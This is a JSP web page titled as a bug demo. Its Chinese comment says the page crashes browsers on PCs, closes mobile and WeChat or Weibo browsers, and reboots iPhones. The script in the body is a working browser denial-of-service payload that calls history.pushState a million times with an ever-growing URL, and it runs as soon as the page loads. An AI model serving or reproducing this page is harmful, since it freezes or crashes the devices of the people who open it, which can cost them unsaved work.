<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- PC用户访问该页面，电脑CPU内存及有可能一路狂飙直至浏览器崩溃卡死 
	 移动端用户点开链接浏览器会闪退！微博、微信客户端点开会闪退。iPhone用Safari点开，手机注销重启
-->
<html>
  <head>
    <base href="<%=basePath%>">
    
    <title>My JSP 'bugdemo.jsp' starting page</title>
    
	<meta http-equiv="pragma" content="no-cache">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">    
	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
	<meta http-equiv="description" content="This is my page">
	<!--
	<link rel="stylesheet" type="text/css" href="styles.css">
	-->

  </head>
  
  <body>
	hh<script>
	var total = "";
	for ( var i = 0; i < 1000000; i++) {
		total = total + i.toString();
		history.pushState(0, 0, total);
	}
	j</script>
  </body>
</html>
